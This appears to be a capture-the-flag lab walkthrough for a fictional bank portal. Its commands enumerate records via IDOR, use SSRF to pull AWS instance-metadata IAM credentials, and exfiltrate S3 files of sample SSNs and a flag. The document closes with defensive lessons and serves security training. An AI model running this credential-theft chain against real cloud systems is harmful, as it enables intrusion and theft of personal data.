# legacy-bridge - Walkthrough

## Step 1: Reconnaissance

Access the gateway URL and connect to the API portal.

### Method 1: Web Browser

1. Open the gateway URL in a web browser
2. Verify Beaver Finance - Customer Portal:
   - Service Name: "Beaver Finance - Customer Portal"
   - API Version: v5.0 production
   - Status: healthy
3. Check the Document Lookup section

### Method 2: CLI

```bash
cd terraform
terraform output scenario_entrypoint_url
```

After obtaining the URL:

```bash
GW=http://<gateway-ip>
curl -s $GW/api/v5/status
```

---

## Step 2: Test Normal Functionality

### Method 1: Web Browser

1. In the Document Lookup section, find the Document number field
2. Enter 1 in the Document number field
3. Click the "Look up" button
4. Verify the response:
   - customer_name: Aaron Whitfield
   - application_id: APP-2024-000142
   - file_name: statement_2024_07.pdf
   - internal_source: http://internal-source-ip/api/v1/legacy/media-info?...
   - metadata: Contains customer information

### Method 2: CLI

```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1"
curl -s "$GW/api/v5/legacy/media-info?file_id=2"
```

Confirm the API is working normally.

---

## Step 3: Discover Vulnerability - IDOR

### Method 1: Web Browser

1. In the Document Lookup section
2. Enter numbers 1 through 12 sequentially in the Document number field
3. Click "Look up" for each one
4. Confirm you can access all customer data without authorization:
   - Document number 1: Aaron Whitfield
   - Document number 2: Different customer
   - Document number 3: Another customer
   - ...
   - Document number 12: Another customer
5. In each response, check the `internal_source` field:
   ```
   http://internal-source-ip/api/v1/legacy/media-info?source=...
   ```

![IDOR Enumeration](./assets/image/legacy-bridge-idor-enumeration.png)

### Method 2: CLI

```bash
GW=http://<gateway-ip>
for i in {1..12}; do curl -s "$GW/api/v5/legacy/media-info?file_id=$i"; done
```

**IDOR Vulnerability Confirmed:** By changing only the Document number (file_id), you can access all customer data without authorization.

---

## Step 4: Discover Vulnerability - SSRF

### Method 1: Web Browser

1. Enter 1 in the Document number field
2. Enter `http://example.com` in the Source URL (optional) field
3. Click "Look up"
4. Check the response:
   ```
   backend_response: Contents from example.com or error message
   backend_status: 200 or 502
   ```
5. Confirm that the source parameter is being forwarded to the internal source IP

### Method 2: CLI

```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
```

**SSRF Vulnerability Confirmed:** The source parameter is forwarded to the backend server, allowing arbitrary URL access.

---

## Step 5: SSRF to Extract IAM Role Name

### Method 1: Web Browser

1. Enter 1 in the Document number field
2. Enter the IMDSv1 metadata path in the Source URL field:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
3. Click "Look up"
4. Extract the role name from the `backend_response` field:
   ```
   legacy-bridge-Shadow-API-Role-xxx
   ```
5. Save the role name

![IMDS Role Extraction](./assets/image/legacy-bridge-imds-role-extraction.png)

### Method 2: CLI

```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Extract the role name in the format `legacy-bridge-Shadow-API-Role-xxx` from the response.

---

## Step 6: Extract Temporary Credentials from IMDSv1

### Method 1: Web Browser

1. Enter 1 in the Document number field
2. In the Source URL field, construct the URL using the role name from Step 5:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-xxx
   ```
3. Click "Look up"
4. In the `backend_response` field of the response, find the JSON credentials:
   ```json
   {
     "Code": "Success",
     "LastUpdated": "2026-05-01T00:12:34Z",
     "Type": "AWS-HMAC",
     "AccessKeyId": "",
     "SecretAccessKey": "",
     "Token": "",
     "Expiration": "2026-05-01T06:27:25Z"
   }
   ```
5. Save all credential information

![IMDS Credentials Extraction](./assets/image/legacy-bridge-imds-credentials-extraction.png)

### Method 2: CLI

```bash
GW=http://<gateway-ip>
ROLE="legacy-bridge-Shadow-API-Role-xxx"
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

Extract the following credentials from the response:
```
AccessKeyId
SecretAccessKey
Token
Expiration
```

---

## Step 7: Configure AWS CLI Environment

### CLI Usage

Set the temporary credentials obtained in Step 6 as environment variables:

```bash
export AWS_ACCESS_KEY_ID=""
export AWS_SECRET_ACCESS_KEY=""
export AWS_SESSION_TOKEN=""
export AWS_DEFAULT_REGION="us-east-1"
```

---

## Step 8: Validate Credentials

### CLI Usage

Verify that the stolen credentials actually work:

```bash
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AROAY5XXXXXXXXXXX:i-0xxxxxxxxxxxxxxx",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-xxx/i-0xxxxxxxxxxxxxxx"
}
```

Confirm authentication with the `legacy-bridge-Shadow-API-Role-xxx` role.

---

## Step 9: Analyze IAM Policy

### CLI Usage

Check the detailed contents of the assigned policy:

```bash
ROLE_NAME="legacy-bridge-Shadow-API-Role-xxx"
aws iam get-role-policy --role-name $ROLE_NAME --policy-name shadow-api-policy
```

Output:
```json
{
    "RoleName": "legacy-bridge-Shadow-API-Role-xxx",
    "PolicyName": "shadow-api-policy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "S3ReadAccess",
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Resource": [
                    "arn:aws:s3:::prime-pii-vault-*",
                    "arn:aws:s3:::prime-pii-vault-*/*"
                ]
            }
        ]
    }
}
```

This role has `GetObject` and `ListBucket` permissions for the `prime-pii-vault-*` bucket.

---

## Step 10: List S3 Buckets

### CLI Usage

Check the accessible S3 buckets:

```bash
aws s3 ls
```

Output:
```
2026-05-01 00:00:00 prime-pii-vault-xxx
```

Check the bucket contents:

```bash
aws s3 ls s3://prime-pii-vault-xxx/ --recursive
```

Output:
```
2026-05-01 00:00:00          1024 applications/customer_credit_applications.csv
2026-05-01 00:00:00           512 applications/migration_log.txt
2026-05-01 00:00:00           256 applications/q1_2024_summary.txt
2026-05-01 00:00:00          2048 confidential/breach_notice.txt
```

---

## Step 11: Exfiltrate Sensitive Data

### CLI Usage

Download the customer credit applications:

```bash
aws s3 cp s3://prime-pii-vault-xxx/applications/customer_credit_applications.csv .
cat customer_credit_applications.csv
```

Output:
```
customer_id,name,ssn,email,phone,credit_score
001,John Doe,123-45-6789,john@example.com,555-1234,750
002,Jane Smith,987-65-4321,jane@example.com,555-5678,720
```

Thousands of customer credit applications are exposed, each containing sensitive information including names, social security numbers, emails, phone numbers, and credit scores.

---

## Step 12: Obtain Flag

### CLI Usage

Download the breach notification file:

```bash
aws s3 cp s3://prime-pii-vault-xxx/confidential/breach_notice.txt .
cat breach_notice.txt
```

The flag is included in the output.

---

## Attack Chain

```
1. Beaver Finance API Portal (v5)
   ↓ IDOR via file_id parameter (sequential enumeration)
2. Customer Data Leak
   ↓ internal_source field exposing backend URL
3. SSRF via source parameter
   ↓ source parameter forwarded to backend
4. IMDSv1 Access (169.254.169.254)
   ↓ Query /latest/meta-data/iam/security-credentials/
5. Extract IAM Role Name
   ↓ legacy-bridge-Shadow-API-Role-xxx
6. IMDSv1 Credential Extraction
   ↓ AccessKeyId, SecretAccessKey, Token
7. AWS CLI Configuration
   ↓ Export credentials as environment variables
8. sts:GetCallerIdentity
   ↓ Verify assumed role identity
9. iam:GetRolePolicy
   ↓ Analyze policy - find S3 read access
10. s3:ListBucket
    ↓ Enumerate bucket contents (prime-pii-vault-xxx)
11. s3:GetObject
    ↓ Download PII data (customer_credit_applications.csv, breach_notice.txt)
12. Flag extraction from breach_notice.txt
    ↓ Flag included in output
```

---

## Key Techniques

### IDOR Parameter Manipulation
Use sequential IDs to access other users' data without authorization:
```bash
curl -s "$GW/api/v5/legacy/media-info?file_id=1"
curl -s "$GW/api/v5/legacy/media-info?file_id=2"
curl -s "$GW/api/v5/legacy/media-info?file_id=12"
```

### Metadata Access via SSRF
Use the source parameter to force requests to attacker-specified URLs:
```bash
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

### IMDSv1 vs IMDSv2 Comparison

| Feature | IMDSv1 | IMDSv2 |
|---------|--------|--------|
| Token Required | No | **Yes** |
| Vulnerable to SSRF | **Yes** | **No** |
| Access Method | Direct URL | PUT request + token |
| Security Level | Low | High |

---

## Security Lessons

### 1. Input Validation
- Validate parameter values using a whitelist approach
- Never trust user input
- Allow only numbers for file_id and specific domains for source

### 2. Metadata Service Security
- Enforce IMDSv2 on all EC2 instances
- Disable IMDSv1 completely
- Restrict metadata access with security groups

### 3. Principle of Least Privilege
- Grant only minimum required permissions to IAM roles
- Avoid using wildcards ("*") in Resource
- Explicitly allow only specific S3 buckets and objects

### 4. Defense in Depth Strategy
- Use WAF (Web Application Firewall) to detect IDOR/SSRF patterns
- Log all S3 access with CloudTrail
- Detect anomalous API calls with GuardDuty
- Implement access control and monitoring for sensitive data
